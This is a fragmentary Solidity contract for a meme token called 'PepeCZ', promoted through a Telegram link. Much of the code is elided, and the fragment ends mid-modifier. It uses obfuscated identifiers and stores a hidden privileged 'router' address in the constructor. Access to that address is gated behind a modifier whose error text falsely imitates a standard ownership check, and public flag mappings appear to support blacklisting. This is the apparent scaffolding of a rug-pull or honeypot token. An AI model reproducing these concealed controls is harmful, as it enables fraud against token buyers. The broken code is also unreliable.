...
/**
PepeCZ  $PepeCZ
https://t.me/PepeCZToken
*/
pragma solidity 0.8.16;
abstract contract PepeCZAs {
...
interface PepeCZAsii is PepeCZAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PepeCZAsiii is PepeCZAs {
...
contract PepeCZTOKEN is PepeCZAs, PepeCZAsi, PepeCZAsii, PepeCZAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public PepeCZAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeFromTransfer;
address private PepeCZRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PepeCZPaw;
  address PepeCZAdr;



    
    constructor(address PepeCZadressss) {
            // Editable
            PepeCZAdr = msg.sender;

        _name = "PepeCZ";
        _symbol = "PepeCZ";
  PepeCZRooter = PepeCZadressss;        
        uint PepeCZTotalSupply = 200000000000 * 10**9;
        process(msg.sender, PepeCZTotalSupply);
    }
    ...
    function transferFrom(
      ...
      modifier SwapAndLiquify() {
        require(PepeCZRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier walo () {
    require(PepeCZAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;
